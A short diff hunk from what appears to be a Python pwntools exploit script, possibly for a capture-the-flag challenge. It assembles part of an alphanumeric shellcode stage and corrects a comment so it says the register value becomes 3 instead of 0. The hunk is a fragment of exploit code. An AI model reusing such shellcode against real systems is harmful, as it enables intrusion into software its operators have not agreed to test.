@@ -56,7 +56,7 @@ payload4+=b'q8'
 payload5 = asm('''
                 push 0x37
                 pop eax
-                xor al,0x34         #eax = 0
+                xor al,0x34         #eax = 3
                 inc ebp             #Padding
                 ''')+b'\x32\x46'
 
